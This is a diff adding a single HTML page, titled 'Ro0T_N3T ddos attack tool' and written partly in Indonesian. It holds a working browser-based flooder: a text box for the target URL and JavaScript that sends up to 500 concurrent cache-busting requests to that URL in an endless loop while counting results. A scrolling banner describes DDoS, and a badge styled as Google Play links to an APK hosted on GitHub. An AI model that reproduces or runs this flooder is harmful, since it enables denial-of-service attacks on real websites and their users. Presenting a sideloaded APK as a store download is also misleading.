@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ro0T_N3T</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f4f8; /* Light blue background */
+            color: #333; /* Dark text color for better readability */
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+        }
+
+        thead {
+            background-color: #33bcb9; /* Blue header */
+            color: white; /* White text color for header */
+        }
+
+        th,
+        td {
+            text-align: left;
+            padding: 12px; /* Increased padding for a spacious feel */
+            border-bottom: 1px solid #ddd;
+        }
+
+        tr:nth-child(even) {
+            background-color: #f2f2f2; /* Light grey for even rows */
+        }
+
+        tr:hover {
+            background-color: #e1f5fe; /* Light blue on hover */
+        }
+
+        #stats {
+            width: 80%;
+            margin: auto;
+        }
+
+        div {
+            display: flex;
+            justify-content: center;
+            margin-top: 20px;
+            margin: 20px;
+        }
+
+        input[type="text"] {
+            width: 50%;
+            padding: 10px;
+            margin-right: 10px;
+            border-radius: 5px;
+            margin: 0.5%;
+            border: 1px solid #33bcb9;
+        }
+
+        button {
+            padding: 10px 20px;
+            border: none;
+            background-color: #33bcb9;
+            color: white;
+            cursor: pointer;
+            margin: 0.5%;
+            border-radius: 5px;
+        }
+
+        button:hover {
+            background-color: #0056b3;
+        }
+        
+       h3{
+
+      font-size: 20px;
+
+      overflow: hidden;
+
+      text-align: auto;
+
+      text-decoration: none;
+
+      font-weight: medium;
+
+      float: center;
+
+      color: #fff;
+
+      user-select: none;
+
+      width: 99%;
+
+      margin-bottom: -0%;
+
+      margin-top: 0%;
+
+      background-color: #33bcb9;
+
+      padding-top: 5px;
+
+      padding-bottom: 5px;
+
+      border-radius: 0px 0px 0px 0px;
+
+      border-bottom: 3px solid #DA2626;
+
+      border: 1px solid #000;
+
+      display: inline-block;
+
+      }
+      marquee{
+
+      font-size: 10px;
+
+      overflow: hidden;
+
+      text-align: auto;
+
+      text-decoration: none;
+
+      font-weight: bold;
+
+      float: center;
+
+      color: #fff;
+
+      user-select: none;
+
+      width: 98%;
+
+      margin-bottom: -0%;
+
+      margin-top: 0%;
+
+      background-color: #33bcb9;
+
+      padding-top: 5px;
+
+      padding-bottom: 5px;
+
+      border-radius: 0px 0px 0px 0px;
+
+      border-bottom: 3px solid #DA2626;
+
+      border: 1px solid #000;
+
+      display: inline-block;
+
+      }
+    </style>
+</head>
+<body>
+
+    <center><h3>Ro0T_N3T ddos attack tool</h3>
+    <audio controls>
+    <source src="tanti.mp3" type="audio/mpeg">
+    Browsermu tidak mendukung tag audio, upgrade donk!
+</audio></center>
+    <div id="controls">
+        <input type="text" id="urlInput" placeholder="Enter URL to attack" />
+        <button id="startBtn">Start Attack</button>
+        <button id="stopBtn" disabled>Stop Attack</button>
+    </div>
+    <div id="stats"></div>
+
+    <script>
+        var targets = {
+            '': { number_of_requests: 0, number_of_errored_responses: 0 },
+        };
+
+        var statsEl = document.getElementById('stats');
+        var attackRunning = false;
+        var targetUrl = '';
+        var floodPromise = null;
+
+        function printStats() {
+            statsEl.innerHTML = '<table border="1"><thead><tr><th>Web</th><th>Success</th><th>Errors</th></tr></thead><tbody>' +
+                Object.entries(targets).map(([target, { number_of_requests, number_of_errored_responses }]) =>
+                    '<tr><td>' + target + '</td><td>' + number_of_requests + '</td><td>' + number_of_errored_responses + '</td></tr>').join('') + '</tbody></table>';
+        }
+        setInterval(printStats, 1000);
+
+        const CONCURRENCY_LIMIT = 500;
+        var queue = [];
+
+        async function fetchWithTimeout(resource, options) {
+            const controller = new AbortController();
+            const id = setTimeout(() => controller.abort(), options.timeout);
+            return fetch(resource, {
+                mode: 'no-cors',
+                signal: controller.signal
+            }).then((response) => {
+                clearTimeout(id);
+                return response;
+            }).catch((error) => {
+                console.log(error.code);
+                clearTimeout(id);
+                throw error;
+            });
+        }
+
+        async function flood(target) {
+            for (var i = 0;; ++i) {
+                if (queue.length >= CONCURRENCY_LIMIT) {
+                    await queue.shift();
+                }
+                var rand = i % 3 === 0 ? '' : ('?' + Math.random() * 20000);
+                queue.push(
+                    fetchWithTimeout(target + rand, { timeout: 1000 })
+                        .catch((error) => {
+                            if (error.code === 20 /* ABORT */) {
+                                return;
+                            }
+                            targets[target].number_of_errored_responses++;
+                        })
+                        .then((response) => {
+                            if (response && !response.ok) {
+                                targets[target].number_of_errored_responses++;
+                            }
+                            targets[target].number_of_requests++;
+                        })
+                );
+            }
+        }
+
+        function startFlood(target) {
+            if (!attackRunning) {
+                attackRunning = true;
+                targets[target] = { number_of_requests: 0, number_of_errored_responses: 0 };
+                floodPromise = flood(target);
+            }
+        }
+
+        function stopFlood() {
+            if (attackRunning) {
+                attackRunning = true;
+                queue.forEach(p => p.abort());
+                queue = [];
+                targets = { '': { number_of_requests: 0, number_of_errored_responses: 0 } }; // Reset stats
+            }
+        }
+
+        document.getElementById('startBtn').addEventListener('click', () => {
+            const url = document.getElementById('urlInput').value;
+            if (url) {
+                targetUrl = url;
+                startFlood(targetUrl);
+                document.getElementById('stopBtn').disabled = true;
+                document.getElementById('startBtn').disabled = true;
+            }
+        });
+
+        document.getElementById('stopBtn').addEventListener('click', () => {
+            stopFlood();
+            document.getElementById('stopBtn').disabled = true;
+            document.getElementById('startBtn').disabled = false;
+        });
+        
+        
+        
+        
+    </script>
+      <center><marquee scrollamount="4">DDoS adalah singkatan dari Distributed Denial of Service yang merupakan serangan siber yang dilakukan dengan membanjiri server atau sistem dengan lalu lintas palsu : Tujuannya adalah untuk membuat server atau sistem tidak tersedia bagi pengguna yang sah
+Serangan ini dilakukan dengan menggunakan sejumlah besar komputer atau perangkat yang terdistribusi secara geografis
+Serangan DDoS dapat mengganggu layanan jaringan, seperti bandwidth jaringan atau kapasitas server
+Serangan DDoS dapat menyebabkan penurunan kinerja atau bahkan penurunan layanan</marquee>
+      <a href="https://github.com/Ro0TN3T/botpulsa/raw/refs/heads/main/NcPulsa_5.5.apk"><img src="https://play.google.com/intl/id/badges/static/images/badges/id_badge_web_generic.png" alt="NcPulsa" height="101" width="259"></a></center>
+</body>
+</html>
